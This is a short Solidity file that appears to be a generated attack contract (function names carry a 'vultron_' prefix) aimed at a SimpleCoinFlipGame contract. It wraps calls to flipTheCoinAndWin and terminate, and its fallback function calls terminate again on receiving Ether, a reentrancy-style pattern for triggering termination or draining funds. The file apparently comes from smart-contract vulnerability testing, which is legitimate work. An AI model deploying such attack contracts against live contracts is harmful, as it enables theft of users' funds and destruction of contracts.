pragma solidity ^0.4.19;

import "./SimpleCoinFlipGame.sol";

contract Attack_SimpleCoinFlipGame1 {

  SimpleCoinFlipGame public target_contract;

  function Attack_SimpleCoinFlipGame1(address _targetContract) public payable {
      target_contract = SimpleCoinFlipGame(_targetContract);
  } 

  function vultron_flipTheCoinAndWin() public {
    target_contract.flipTheCoinAndWin();
  } 

  function vultron_terminate() public {
    target_contract.terminate();
  } 

      function() public payable {
        
        target_contract.terminate();
      }
      } 
